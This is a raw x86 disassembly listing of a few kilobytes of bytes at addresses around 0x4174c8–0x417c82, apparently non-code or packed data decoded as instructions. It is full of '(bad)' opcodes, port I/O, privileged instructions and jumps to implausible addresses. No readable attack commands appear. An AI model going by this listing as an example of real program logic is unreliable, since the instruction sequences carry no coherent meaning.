  4174c8:	sub    ebx,DWORD PTR [esi-0x7]
  4174cb:	xchg   edi,eax
  4174cc:	inc    ebp
  4174cd:	or     bh,BYTE PTR [edi+0x25]
  4174d0:	add    eax,0x479aeee5
  4174d5:	jp     0x41748a
  4174d7:	mov    ss,eax
  4174d9:	stos   DWORD PTR es:[edi],eax
  4174da:	jmp    0x183d81b9
  4174df:	lea    ecx,[edx+0x6f]
  4174e2:	stc    
  4174e3:	xor    esp,DWORD PTR [esi-0x11]
  4174e6:	das    
  4174e7:	clc    
  4174e8:	xchg   esi,eax
  4174e9:	xchg   esi,eax
  4174ea:	lods   eax,DWORD PTR ds:[esi]
  4174eb:	pop    esp
  4174ec:	and    DWORD PTR [edx+ebx*1-0x6d],ebx
  4174f0:	lahf   
  4174f1:	sub    cl,0x98
  4174f4:	jns    0x41752b
  4174f6:	jbe    0x417565
  4174f8:	lods   al,BYTE PTR ds:[esi]
  4174f9:	push   esp
  4174fa:	daa    
  4174fb:	nop
  4174fc:	fs and bl,al
  4174ff:	leave  
  417500:	cmp    al,0x18
  417502:	shl    DWORD PTR [edx-0x40de4aaf],1
  417508:	fldenv [ebx+0x53a4eeb4]
  41750e:	jp     0x417560
  417510:	sub    BYTE PTR [esi+0x3d],ah
  417513:	int3   
  417514:	outs   dx,BYTE PTR ds:[esi]
  417515:	mov    dh,0xe4
  417517:	jecxz  0x417562
  417519:	cmp    BYTE PTR [esi-0x58],ch
  41751c:	ins    BYTE PTR es:[edi],dx
  41751d:	fcomp  st(6)
  41751f:	call   0x9a6:0x7fc15d39
  417526:	les    esp,FWORD PTR [edx-0x10769024]
  41752c:	mov    cl,0x3f
  41752e:	stos   DWORD PTR es:[edi],eax
  41752f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417530:	adc    DWORD PTR [eax+esi*8-0x1a],esp
  417534:	dec    ebx
  417535:	adc    BYTE PTR [eax-0x2721af1],dh
  41753b:	lods   eax,DWORD PTR ds:[esi]
  41753c:	mov    esi,0x1b70c593
  417541:	pop    edi
  417542:	jp     0x4175c2
  417544:	jns    0x417557
  417546:	dec    ecx
  417547:	and    al,0x3
  417549:	jbe    0x4174d0
  41754b:	(bad)  
  41754c:	sbb    esp,DWORD PTR [eax+0x4c]
  41754f:	dec    edx
  417550:	lock dec ecx
  417552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417553:	mov    eax,0xfb7e31f5
  417558:	(bad)  
  417559:	add    esp,edi
  41755b:	jge    0x4175ba
  41755d:	into   
  41755e:	mov    dh,0xa3
  417560:	mov    ds:0x4c4d07fd,al
  417565:	pop    eax
  417566:	xchg   edx,eax
  417567:	or     dl,cl
  417569:	inc    edx
  41756a:	sbb    BYTE PTR [edi-0x2d],ch
  41756d:	xchg   ecx,eax
  41756e:	lods   al,BYTE PTR ds:[esi]
  41756f:	push   ebx
  417570:	sub    dl,BYTE PTR [ecx]
  417572:	xor    esp,esi
  417574:	mov    fs,ebx
  417576:	loope  0x4175a1
  417578:	xlat   BYTE PTR ds:[ebx]
  417579:	hlt    
  41757a:	or     eax,0x6914d42d
  41757f:	mov    eax,0x6ef10fd3
  417584:	mov    al,cs:0x3940e5
  41758a:	fs out dx,al
  41758c:	into   
  41758d:	lea    ecx,ds:0xfea622ec
  417593:	mov    ebx,DWORD PTR [eax-0x56141d87]
  417599:	pop    edx
  41759a:	out    dx,al
  41759b:	jno    0x41753a
  41759d:	dec    ebp
  41759e:	pop    es
  41759f:	inc    edx
  4175a0:	aas    
  4175a1:	add    al,0xda
  4175a3:	cmp    al,0x62
  4175a5:	ror    DWORD PTR [ecx+edi*2-0x4c620e91],1
  4175ac:	les    esp,FWORD PTR [eax]
  4175ae:	sbb    al,0xfc
  4175b0:	pop    ebx
  4175b1:	adc    DWORD PTR [ebx-0x7f771cb4],0x22c22644
  4175bb:	sub    al,0x68
  4175bd:	dec    ebx
  4175be:	mov    eax,0x489cae3d
  4175c3:	push   ecx
  4175c4:	inc    ecx
  4175c5:	pop    esp
  4175c6:	ficom  WORD PTR [eax]
  4175c8:	sub    al,0x76
  4175ca:	mov    cs,edx
  4175cc:	aaa    
  4175cd:	or     al,0x35
  4175cf:	inc    edi
  4175d0:	and    al,BYTE PTR [ebx+eiz*4]
  4175d3:	mov    ebx,0x7eb277c7
  4175d8:	lds    ebx,FWORD PTR [ebx+0x77bc3fce]
  4175de:	and    bl,bl
  4175e0:	fcom   DWORD PTR [eax]
  4175e2:	scas   al,BYTE PTR es:[edi]
  4175e3:	xchg   ch,cl
  4175e5:	cmp    eax,0xd2d3c7f6
  4175ea:	mov    ds:0xf13f70f5,al
  4175ef:	into   
  4175f0:	popa   
  4175f1:	xchg   ecx,eax
  4175f2:	loope  0x4175b5
  4175f4:	jg     0x41757e
  4175f6:	test   DWORD PTR [ecx+0x65dfb69f],ecx
  4175fc:	mov    DWORD PTR [eax+0x71],ecx
  4175ff:	mov    ebp,DWORD PTR [edx+0x5171cc9f]
  417605:	lds    ebp,FWORD PTR [edx+0x7fda8ead]
  41760b:	sub    eax,0xa7feeda8
  417610:	inc    edi
  417611:	lock sbb cl,BYTE PTR [eax+0x4a]
  417615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417616:	into   
  417617:	aad    0xbe
  417619:	sti    
  41761a:	mov    al,ds:0x3a483752
  41761f:	adc    al,0xa0
  417621:	mov    ds:0x40e6a560,eax
  417626:	inc    eax
  417627:	push   ebp
  417628:	dec    esp
  417629:	and    DWORD PTR [ecx],esp
  41762b:	popf   
  41762c:	fcmovnb st,st(2)
  41762e:	add    eax,edx
  417630:	outs   dx,DWORD PTR ds:[esi]
  417631:	mov    ebx,0xdd69ef0
  417636:	(bad)  [eax+0x63657ce7]
  41763c:	sub    BYTE PTR [edx],ch
  41763e:	mov    edi,0x2bb76dd8
  417643:	inc    esi
  417644:	xor    esi,DWORD PTR [eax-0x7377621e]
  41764a:	dec    eax
  41764b:	iret   
  41764c:	add    DWORD PTR [edi+0x70],edx
  41764f:	mov    esi,0x41674f24
  417654:	or     ch,BYTE PTR [esi+0x280dc835]
  41765a:	scas   eax,DWORD PTR es:[edi]
  41765b:	jge    0x41765e
  41765d:	adc    esi,DWORD PTR [ebp-0x39]
  417660:	into   
  417661:	jnp    0x41761f
  417663:	jb     0x41769d
  417665:	jl     0x41769d
  417667:	mov    ds:0x139ec1a0,eax
  41766c:	(bad)  
  41766d:	test   al,0x6f
  41766f:	outs   dx,DWORD PTR ds:[esi]
  417670:	loopne 0x41760c
  417672:	out    0xf9,al
  417674:	fisub  WORD PTR [ebx+0x27ea3c87]
  41767a:	cmp    al,0xa6
  41767c:	pop    edi
  41767d:	fs jno 0x417642
  417680:	lds    edi,FWORD PTR [ebp+0x72d70f52]
  417686:	inc    ebp
  417687:	or     eax,0x7939c4b
  41768c:	es add eax,0x36c4cdbd
  417692:	push   0x8bf7f5c7
  417697:	dec    ecx
  417698:	jae    0x417684
  41769a:	pusha  
  41769b:	mov    esi,0x4d728ab8
  4176a0:	dec    ebp
  4176a1:	dec    ebx
  4176a2:	jp     0x417629
  4176a4:	pop    es
  4176a5:	test   eax,0xfa43d534
  4176aa:	xor    al,0x52
  4176ac:	adc    esi,DWORD PTR [edi+0x64]
  4176af:	pop    edx
  4176b0:	adc    eax,0x73a2c6d8
  4176b5:	mov    ebp,0x7d2259d5
  4176ba:	leave  
  4176bb:	aas    
  4176bc:	mul    dl
  4176be:	aas    
  4176bf:	call   0x30669e4a
  4176c4:	push   cs
  4176c5:	cdq    
  4176c6:	aas    
  4176c7:	inc    ecx
  4176c8:	push   0x9e711dd1
  4176cd:	scas   eax,DWORD PTR es:[edi]
  4176ce:	and    bl,BYTE PTR [edx+0x72]
  4176d1:	(bad)  
  4176d2:	jne    0x41771e
  4176d4:	aaa    
  4176d5:	scas   al,BYTE PTR es:[edi]
  4176d6:	mov    esp,0xbef1e49f
  4176db:	mov    al,ds:0xfce762b
  4176e0:	loope  0x41766b
  4176e2:	dec    edi
  4176e3:	xlat   BYTE PTR ds:[ebx]
  4176e4:	push   0x65
  4176e6:	ins    DWORD PTR es:[edi],dx
  4176e7:	xchg   ebp,eax
  4176e8:	or     ecx,DWORD PTR [esi-0x11]
  4176eb:	fdiv   st,st(5)
  4176ed:	xor    cl,BYTE PTR [edx*8+0x14ee7365]
  4176f4:	fimul  DWORD PTR [edx+0x39848103]
  4176fa:	mov    BYTE PTR [edi+0x22],bh
  4176fd:	lea    ebx,[edx+0x71]
  417700:	xor    ebx,DWORD PTR [eax-0x71061278]
  417706:	jno    0x417736
  417708:	loop   0x417745
  41770a:	psubd  mm4,QWORD PTR [esi]
  41770d:	hlt    
  41770e:	add    DWORD PTR [esi],esi
  417710:	mov    bh,0xfa
  417712:	push   edx
  417713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417714:	xchg   ebx,eax
  417715:	(bad)  
  417716:	test   eax,0x6bec7aa8
  41771b:	add    eax,0x5d22ea35
  417720:	mov    dh,0x60
  417722:	jl     0x41771d
  417724:	repnz mov cl,0x9c
  417727:	add    BYTE PTR [esi+ecx*1],cl
  41772a:	cld    
  41772b:	ja     0x41777d
  41772d:	xor    eax,0xe88f5990
  417732:	dec    esi
  417733:	jnp    0x4176b6
  417735:	jnp    0x41774f
  417737:	mov    dh,0x46
  417739:	pop    ds
  41773a:	cdq    
  41773b:	adc    BYTE PTR [edi-0x40db81e4],dl
  417741:	mov    edx,0xf4ba9330
  417746:	push   ds
  417747:	xor    ch,BYTE PTR [ecx+0x71]
  41774a:	xor    esi,ebp
  41774c:	mov    bl,0xe3
  41774e:	xor    ebx,DWORD PTR [ebp-0x44f5e16f]
  417754:	loope  0x417755
  417756:	(bad)  
  417757:	fisttp QWORD PTR [ecx]
  417759:	lahf   
  41775a:	jne    0x4177d1
  41775c:	in     eax,0x15
  41775e:	ds dec ebp
  417760:	loop   0x41775a
  417762:	mov    eax,ds:0xd3377faa
  417767:	out    dx,eax
  417768:	stos   BYTE PTR es:[edi],al
  417769:	jo     0x4177ca
  41776b:	and    eax,ecx
  41776d:	pushf  
  41776e:	adc    eax,0x61158d8a
  417773:	pushf  
  417774:	lahf   
  417775:	call   0x206b6b51
  41777a:	cmp    esp,0xd0470bfc
  417780:	in     al,0xf4
  417782:	mov    ch,0x82
  417784:	(bad)  
  417785:	mov    edx,0xc40a065e
  41778a:	sub    BYTE PTR [edx-0xa],dl
  41778d:	mov    bl,0xd
  41778f:	inc    esi
  417790:	inc    ebx
  417791:	fst    st(1)
  417793:	popf   
  417794:	pop    ebp
  417795:	mov    bh,0x96
  417797:	in     al,dx
  417798:	lock sbb ecx,ebp
  41779b:	repnz xor eax,0xc1aad39c
  4177a1:	cmp    esi,ebx
  4177a3:	cmp    al,0xf3
  4177a5:	aad    0x7b
  4177a7:	pop    esi
  4177a8:	sbb    BYTE PTR [eax+0x4eb6a5fd],ch
  4177ae:	into   
  4177af:	lods   eax,DWORD PTR ds:[esi]
  4177b0:	sub    eax,DWORD PTR [esi]
  4177b2:	sub    eax,0xd4fde17d
  4177b7:	adc    BYTE PTR cs:[ebp+0x27],al
  4177bb:	mov    ecx,0x327298
  4177c0:	jmp    0x417cd2
  4177c5:	(bad)
  4177c8:	enter  0xcfc5,0xd5
  4177cc:	aad    0x91
  4177ce:	xor    eax,0xfdaef48d
  4177d3:	pop    ecx
  4177d4:	fs (bad) 
  4177d6:	xlat   BYTE PTR ds:[ebx]
  4177d7:	jg     0x417851
  4177d9:	jae    0x417857
  4177db:	js     0x417855
  4177dd:	push   ds
  4177de:	pop    eax
  4177df:	scas   eax,DWORD PTR es:[edi]
  4177e0:	cwde   
  4177e1:	adc    bh,BYTE PTR [edx+0x33272e57]
  4177e7:	add    al,BYTE PTR [edi-0x39]
  4177ea:	frstor [ebx]
  4177ec:	js     0x41776e
  4177ee:	push   eax
  4177ef:	mov    bl,0x9b
  4177f1:	cdq    
  4177f2:	(bad)  
  4177f3:	(bad)  
  4177f4:	aas    
  4177f5:	xchg   BYTE PTR [edi+ebp*4-0x429264c4],dh
  4177fc:	push   ss
  4177fd:	jge    0x417860
  4177ff:	int3   
  417800:	mov    ch,0x1c
  417802:	stos   DWORD PTR es:[edi],eax
  417803:	out    dx,al
  417804:	jmp    0x4177b3
  417806:	mov    edx,0xfc5fa558
  41780b:	and    bh,al
  41780d:	cmovnp eax,ecx
  417810:	dec    eax
  417811:	add    DWORD PTR [edi],0xffffffa2
  417814:	pop    eax
  417815:	xchg   ebx,eax
  417816:	jp     0x417883
  417818:	xor    ah,cl
  41781a:	js     0x41789a
  41781c:	sub    eax,0xd1480fea
  417821:	mov    al,ds:0x1dcfcec1
  417826:	xchg   esi,eax
  417827:	in     al,dx
  417828:	mov    ah,0xdc
  41782a:	jmp    0x41780e
  41782c:	pop    ss
  41782d:	mov    esp,esp
  41782f:	or     bh,BYTE PTR [esi-0x3a]
  417832:	sbb    eax,0x2446cbed
  417837:	add    BYTE PTR [ecx],al
  417839:	push   ss
  41783a:	sar    edi,cl
  41783c:	and    BYTE PTR [esi+ebp*8],bl
  41783f:	inc    BYTE PTR ds:0xfb288389
  417845:	sub    DWORD PTR [esi+0x58],esi
  417848:	mov    esp,0x3f7200a6
  41784d:	pop    ds
  41784e:	mov    ds:0x645a787e,al
  417853:	pop    esi
  417854:	push   eax
  417855:	in     al,dx
  417856:	push   ebp
  417857:	out    dx,al
  417858:	pop    ss
  417859:	xlat   BYTE PTR ds:[ebx]
  41785a:	(bad)  
  41785b:	push   edi
  41785c:	in     al,dx
  41785d:	jnp    0x4178da
  41785f:	push   cs
  417860:	ror    DWORD PTR [eax-0x8aeb419],cl
  417866:	jp     0x417889
  417868:	xchg   edx,eax
  417869:	add    ah,BYTE PTR [ebx-0x94679e1]
  41786f:	(bad)  
  417870:	out    dx,al
  417871:	add    al,0xcd
  417873:	hlt    
  417874:	mov    BYTE PTR [edi+0x99a7670],cl
  41787a:	aaa    
  41787b:	leave  
  41787c:	xchg   DWORD PTR [ecx],edi
  41787e:	jl     0x417849
  417880:	cdq    
  417881:	mov    WORD PTR [edx+0x58],?
  417884:	push   ecx
  417885:	rol    DWORD PTR [ebp+0x2a],0xa8
  417889:	or     al,0x6
  41788b:	jge    0xe12dde8f
  417891:	hlt    
  417892:	push   eax
  417893:	inc    ecx
  417894:	xlat   BYTE PTR ds:[ebx]
  417895:	je     0x4178d3
  417897:	mov    al,ds:0xc79b3e55
  41789c:	pop    esp
  41789d:	(bad)  
  41789e:	mov    edi,0x1c0d153c
  4178a3:	data16 js 0x41789c
  4178a6:	lods   al,BYTE PTR ds:[esi]
  4178a7:	dec    esp
  4178a8:	ja     0x417830
  4178aa:	mov    bh,cl
  4178ac:	cmc    
  4178ad:	cld    
  4178ae:	jmp    0x8cdf:0x26cf5a92
  4178b5:	push   0x11
  4178b7:	popa   
  4178b8:	(bad)
  4178bb:	fwait
  4178bc:	out    0xf,al
  4178be:	inc    edx
  4178bf:	pop    ds
  4178c0:	adc    al,0x45
  4178c2:	ins    BYTE PTR es:[edi],dx
  4178c3:	push   es
  4178c4:	sub    eax,0x569f03d9
  4178c9:	hlt    
  4178ca:	out    0x26,eax
  4178cc:	mov    ds:0x8479361,al
  4178d1:	sbb    DWORD PTR [ebx+0x6],ebp
  4178d4:	imul   ebx,DWORD PTR [edi+0x62d7e6cb],0x2bbffd9f
  4178de:	push   edi
  4178df:	or     ch,BYTE PTR [eax+0x5e8fad0e]
  4178e5:	cmp    ebp,ecx
  4178e7:	xchg   ebx,eax
  4178e8:	test   al,0x1e
  4178ea:	cmp    BYTE PTR [edi-0x4f00deb0],ah
  4178f0:	popa   
  4178f1:	(bad)  
  4178f2:	and    esi,ebx
  4178f4:	int    0xda
  4178f6:	imul   esp,edi,0x4a
  4178f9:	adc    BYTE PTR [esi+0x5c558572],ch
  4178ff:	dec    BYTE PTR [edx-0x11fc157f]
  417905:	jl     0x417985
  417907:	add    cl,BYTE PTR [esi-0x6c]
  41790a:	or     bh,BYTE PTR [eax+0x4bd360be]
  417910:	dec    edx
  417911:	xchg   ecx,eax
  417912:	jne    0x41792c
  417914:	cmp    BYTE PTR [edi-0x132faab6],al
  41791a:	out    0x35,al
  41791c:	icebp  
  41791d:	jl     0x4178dc
  41791f:	fwait
  417920:	mov    al,ds:0x70d6c411
  417925:	pop    ss
  417926:	sbb    al,0x48
  417929:	test   DWORD PTR [esi-0x44],0x1a3d8a92
  417930:	leave  
  417931:	mov    cl,0x65
  417933:	loope  0x4178d6
  417935:	sub    BYTE PTR [edx],0x1d
  417938:	ins    BYTE PTR es:[edi],dx
  417939:	cld    
  41793a:	sub    edi,DWORD PTR [ecx]
  41793c:	push   ebx
  41793d:	pop    ds
  41793e:	sahf   
  41793f:	dec    DWORD PTR [ebx]
  417941:	sub    al,0xfa
  417943:	imul   ebp,DWORD PTR [edi],0xffffff8f
  417946:	adc    edi,ecx
  417948:	jg     0x4178d9
  41794a:	push   esp
  41794b:	dec    DWORD PTR [edx+0x64]
  41794e:	mov    ebx,0xe4fef1e8
  417953:	jg     0x41797d
  417955:	retf   0xc152
  417958:	aam    0xa5
  41795a:	cmc    
  41795b:	sbb    al,ah
  41795d:	test   DWORD PTR [edx+0xc],edi
  417960:	dec    esi
  417961:	int3   
  417962:	call   0x7b39b180
  417967:	mov    DWORD PTR [esi+0x2a],ecx
  41796a:	icebp  
  41796b:	push   esp
  41796c:	adc    dl,BYTE PTR [ebp+eax*2+0x6d]
  417970:	push   0x1e46d403
  417975:	cld    
  417976:	pop    ebx
  417977:	xchg   DWORD PTR [ebp+0x73ce2adb],ecx
  41797d:	dec    esp
  41797e:	sbb    dh,BYTE PTR ds:0x8419c4f7
  417984:	loop   0x41799a
  417986:	push   edi
  417987:	sub    al,0xcc
  417989:	ja     0x417981
  41798b:	lea    ecx,[ecx+0x2bef2bd3]
  417991:	leave  
  417992:	xor    esi,DWORD PTR [eax]
  417994:	nop
  417995:	adc    esp,DWORD PTR [ecx]
  417997:	clc    
  417998:	popa   
  417999:	mov    cl,0x81
  41799b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41799c:	xchg   esi,eax
  41799d:	aas    
  41799e:	rol    bh,cl
  4179a0:	adc    DWORD PTR ds:0x76de6675,ebp
  4179a6:	pusha  
  4179a7:	loop   0x417967
  4179a9:	push   esi
  4179aa:	enter  0x76b8,0x7f
  4179ae:	sbb    al,0xa2
  4179b0:	popf   
  4179b1:	mov    ds:0x999c3ee4,eax
  4179b6:	pop    edi
  4179b7:	ret    0x341d
  4179ba:	inc    esp
  4179bb:	sbb    eax,ecx
  4179bd:	aaa    
  4179be:	lods   eax,DWORD PTR ds:[esi]
  4179bf:	xor    al,0xb3
  4179c1:	ds nop
  4179c3:	ins    DWORD PTR es:[edi],dx
  4179c4:	mov    esi,0x794c719d
  4179c9:	push   0xffffffc8
  4179cb:	popa   
  4179cc:	inc    ecx
  4179cd:	das    
  4179ce:	mov    ds:0x3f2bd383,al
  4179d3:	loopne 0x417957
  4179d5:	mov    dh,0xc3
  4179d7:	xchg   esp,eax
  4179d8:	push   edi
  4179d9:	(bad)  
  4179da:	int3   
  4179db:	mov    esp,0xc6373b7f
  4179e0:	push   edi
  4179e1:	fsub   QWORD PTR [edi-0x11]
  4179e4:	dec    esi
  4179e5:	lea    ebp,[ebx]
  4179e7:	pop    ss
  4179e8:	push   ebp
  4179e9:	xchg   dl,bh
  4179eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ec:	mov    eax,ds:0x9cd6b158
  4179f1:	fadd   QWORD PTR [esi+0x23]
  4179f4:	push   edi
  4179f5:	out    dx,al
  4179f6:	imul   edi,DWORD PTR [ebp+0x75ecb01d],0xffffffca
  4179fd:	icebp  
  4179fe:	jp     0x417a72
  417a00:	(bad)  
  417a01:	mov    ds,WORD PTR [edx]
  417a03:	in     al,dx
  417a04:	add    BYTE PTR [edx],bh
  417a06:	loope  0x4179af
  417a08:	adc    edi,eax
  417a0a:	sbb    al,0xbc
  417a0c:	lods   eax,DWORD PTR ds:[esi]
  417a0d:	ret    0x5297
  417a10:	js     0x4179f3
  417a12:	(bad)  [ebx+0x62040fea]
  417a18:	mov    edi,edx
  417a1a:	fiadd  DWORD PTR [edi]
  417a1c:	jae    0x417a38
  417a1e:	and    DWORD PTR [ebx-0x3a5ef814],ebx
  417a24:	aam    0x36
  417a26:	sub    BYTE PTR [ebx-0x16],dl
  417a29:	(bad)  
  417a2a:	pop    eax
  417a2b:	div    DWORD PTR [esi+0xeae0bcc]
  417a31:	in     eax,dx
  417a32:	loope  0x417aab
  417a34:	mov    bl,0xc9
  417a36:	push   ebx
  417a37:	push   ecx
  417a38:	mov    dl,0xac
  417a3a:	mov    cl,0xad
  417a3c:	jns    0x417a76
  417a3e:	les    edx,FWORD PTR [ebp+eiz*4+0x45]
  417a42:	lods   al,BYTE PTR ds:[esi]
  417a43:	mov    esi,ds
  417a45:	in     eax,0x42
  417a47:	int    0x90
  417a49:	sbb    al,0xf7
  417a4b:	das    
  417a4c:	stos   DWORD PTR es:[edi],eax
  417a4d:	xor    eax,0xf0898054
  417a52:	out    0x71,eax
  417a54:	subps  xmm6,XMMWORD PTR [edi+0x1acf7ee7]
  417a5b:	xor    BYTE PTR [eax-0x62],bh
  417a5e:	repnz push eax
  417a60:	add    eax,0x47e95706
  417a65:	(bad)  
  417a66:	jl     0x417ac4
  417a68:	ret    
  417a69:	and    DWORD PTR [edx*2-0x26f102eb],ebx
  417a70:	lahf   
  417a71:	xor    al,0x5b
  417a73:	jecxz  0x417a21
  417a75:	jmp    0x40b35220
  417a7a:	in     al,0x7
  417a7c:	rol    eax,1
  417a7e:	xor    dl,BYTE PTR [edi+0x70]
  417a81:	add    dl,al
  417a83:	sub    BYTE PTR [esi+edx*1],al
  417a86:	faddp  st(5),st
  417a88:	sbb    DWORD PTR [edi],edi
  417a8a:	ror    al,0x3b
  417a8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a8e:	sub    DWORD PTR [edi+0x6e9c5c6c],edx
  417a94:	xor    BYTE PTR [esi-0x24c5626d],bl
  417a9a:	xchg   edi,eax
  417a9b:	jp     0x417ae6
  417a9d:	jp     0x417aa3
  417a9f:	sbb    al,0xb6
  417aa1:	ret    
  417aa2:	or     eax,0x56ccb39b
  417aa7:	pop    edi
  417aa8:	mov    edi,0xfb4381aa
  417aad:	sub    eax,0x950f6dc6
  417ab2:	jg     0x417a59
  417ab4:	das    
  417ab5:	add    DWORD PTR [esi-0x62d7c761],0x60
  417abc:	enter  0xedcb,0x8b
  417ac0:	dec    ecx
  417ac1:	repz mov bh,0xe7
  417ac4:	push   ds
  417ac5:	shr    BYTE PTR [ecx+0x47],cl
  417ac8:	mov    bl,0x4d
  417aca:	dec    ecx
  417acb:	ins    DWORD PTR es:[edi],dx
  417acc:	cmp    eax,0x1bc26b52
  417ad1:	pop    edi
  417ad2:	add    DWORD PTR [esi+ecx*2+0x3acf0fab],edx
  417ad9:	das    
  417ada:	sti    
  417adb:	icebp  
  417adc:	jo     0x417b2b
  417ade:	call   0x5edcd2f5
  417ae3:	add    DWORD PTR [ebp-0x36],ebp
  417ae6:	dec    ebx
  417ae8:	mov    eax,ds:0x7ea8d43a
  417aed:	data16 mov cl,0x2d
  417af0:	test   DWORD PTR [eax-0x29e822df],esp
  417af6:	test   eax,0xb7677ea2
  417afb:	out    0x51,eax
  417afd:	mov    esp,0xd8b99437
  417b02:	or     ebp,edx
  417b04:	add    bh,BYTE PTR fs:[ecx+eax*1+0x72]
  417b09:	outs   dx,BYTE PTR ds:[esi]
  417b0a:	arpl   WORD PTR [eax],si
  417b0c:	cmc    
  417b0d:	cmp    BYTE PTR [ebp+0x6f],dl
  417b10:	mov    ebx,?
  417b12:	inc    edx
  417b13:	pop    es
  417b14:	pop    ebp
  417b15:	sbb    eax,0x247f346c
  417b1a:	cmp    esp,DWORD PTR [edx+eiz*8]
  417b1d:	aaa    
  417b1e:	imul   esi,DWORD PTR [ebx],0xffffffad
  417b21:	xor    eax,0x17e73be
  417b26:	shl    edx,1
  417b28:	push   edi
  417b29:	or     ah,BYTE PTR [esi]
  417b2b:	enter  0x6462,0x71
  417b2f:	int3   
  417b30:	ins    BYTE PTR es:[edi],dx
  417b31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b32:	pop    ds
  417b33:	or     eax,0x3e07d8d8
  417b38:	mov    bh,0xa0
  417b3a:	sub    DWORD PTR [ecx-0x4ad92ec5],edi
  417b40:	dec    eax
  417b41:	(bad)  
  417b42:	je     0x417adc
  417b44:	bound  ecx,QWORD PTR [ecx+0x7bc9fbd9]
  417b4a:	fstp   DWORD PTR [ebp-0x6fabfb81]
  417b50:	cli    
  417b51:	dec    edx
  417b52:	and    dl,dh
  417b54:	mov    ds:0x23e841b2,al
  417b59:	icebp  
  417b5a:	pop    eax
  417b5b:	retf   
  417b5c:	mov    ecx,0x5aea517a
  417b61:	and    eax,0x9d75b83d
  417b66:	adc    al,0x92
  417b68:	hlt    
  417b69:	gs retf 0x9d7d
  417b6d:	jno    0x417b8b
  417b6f:	or     al,0xd7
  417b71:	aam    0x2c
  417b73:	test   cl,bl
  417b75:	call   0x2a431b70
  417b7a:	jp     0x417b94
  417b7c:	and    bh,BYTE PTR [edi+0x12]
  417b7f:	adc    BYTE PTR [ebx-0x2b],bl
  417b82:	adc    eax,0x43145c52
  417b87:	data16 xor cl,BYTE PTR [ebp-0x42]
  417b8b:	std    
  417b8c:	add    dl,bh
  417b8e:	sahf   
  417b8f:	cld    
  417b90:	in     eax,dx
  417b91:	push   edi
  417b92:	nop
  417b93:	sar    BYTE PTR [ebx+eiz*4-0x4ded5536],1
  417b9a:	dec    esp
  417b9b:	push   0xfffffffa
  417b9d:	arpl   WORD PTR [eax],sp
  417b9f:	iret   
  417ba0:	js     0x417b78
  417ba2:	add    BYTE PTR [ebx],0xc3
  417ba5:	mov    al,0x43
  417ba7:	push   edx
  417ba8:	mov    al,0x82
  417baa:	xchg   esi,eax
  417bab:	jb     0x417b7f
  417bad:	adc    dl,BYTE PTR [edx]
  417baf:	adc    dl,dl
  417bb1:	imul   ebx,ebx,0x24
  417bb4:	add    DWORD PTR [edi],edi
  417bb6:	adc    DWORD PTR [ecx],ecx
  417bb8:	ins    BYTE PTR es:[edi],dx
  417bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bba:	mov    ss,eax
  417bbc:	jno    0x417b4e
  417bbe:	pop    ecx
  417bbf:	icebp  
  417bc0:	add    ebx,DWORD PTR [edi]
  417bc2:	xchg   esi,eax
  417bc3:	repz dec edi
  417bc5:	(bad)  
  417bc6:	dec    edi
  417bc7:	daa    
  417bc8:	jecxz  0x417bff
  417bca:	cvtpi2ps xmm0,QWORD PTR [esi-0xe55fd73]
  417bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bd2:	mov    eax,0x5755beec
  417bd7:	lods   al,BYTE PTR ds:[esi]
  417bd8:	fimul  DWORD PTR es:[ecx+0x569b604f]
  417bdf:	in     eax,0x6c
  417be1:	xchg   ecx,eax
  417be2:	or     ebp,ebp
  417be4:	mov    bl,0x25
  417be6:	repz int 0xf1
  417be9:	push   ebp
  417bea:	add    edi,DWORD PTR [edx]
  417bec:	mov    cl,0x64
  417bee:	sub    eax,0x24deee37
  417bf3:	add    BYTE PTR [edi+0x63],bl
  417bf6:	push   ebx
  417bf7:	not    BYTE PTR [ecx+ecx*8-0x51]
  417bfb:	mov    ds:0x50e82819,eax
  417c00:	ret    0x730d
  417c03:	sub    DWORD PTR [eax-0x79a30b81],eax
  417c09:	dec    ebx
  417c0a:	jb     0x417c07
  417c0c:	push   ecx
  417c0d:	jmp    0x417c37
  417c0f:	out    dx,al
  417c10:	and    BYTE PTR [edx],ch
  417c12:	mov    ch,0x73
  417c14:	inc    ebx
  417c15:	leave  
  417c16:	xchg   esp,eax
  417c17:	mov    ah,0xa1
  417c19:	jecxz  0x417bb2
  417c1b:	rcr    edi,cl
  417c1d:	add    ch,BYTE PTR [edx+0x63]
  417c20:	dec    eax
  417c21:	aas    
  417c22:	add    eax,0x8f1a11bd
  417c27:	fxtract 
  417c29:	xor    eax,0x35550f3e
  417c2e:	or     edx,ebp
  417c30:	les    ecx,FWORD PTR [esi+ebp*4-0x5da753b9]
  417c37:	dec    edx
  417c38:	pop    edx
  417c39:	adc    al,0xf1
  417c3b:	lods   eax,DWORD PTR ds:[esi]
  417c3c:	pop    esi
  417c3d:	push   ebp
  417c3e:	jo     0x417c84
  417c40:	jmp    0x417c1f
  417c42:	scas   eax,DWORD PTR es:[edi]
  417c43:	mov    edx,esi
  417c45:	loop   0x417c53
  417c47:	xchg   ebx,eax
  417c48:	popa   
  417c49:	rcl    DWORD PTR [edx],cl
  417c4b:	push   ecx
  417c4c:	cs sti 
  417c4e:	(bad)  
  417c4f:	pop    esi
  417c50:	mov    eax,ds:0x39743258
  417c55:	aas    
  417c56:	(bad)  
  417c57:	jnp    0x417bf1
  417c59:	loope  0x417c20
  417c5b:	mov    ebx,0x9061e96
  417c60:	scas   eax,DWORD PTR es:[edi]
  417c61:	add    BYTE PTR [ebx-0x6ec5ed41],0x3c
  417c68:	dec    eax
  417c69:	and    eax,0xc8f0738a
  417c6e:	fdivr  DWORD PTR [bp+si-0x7d65]
  417c73:	lock and ah,BYTE PTR [ebx-0x34]
  417c77:	int    0xa0
  417c79:	scas   eax,DWORD PTR es:[edi]
  417c7a:	pop    ss
  417c7b:	gs pop esp
  417c7d:	or     eax,0x8e52bcb9
  417c82:	push   ebp
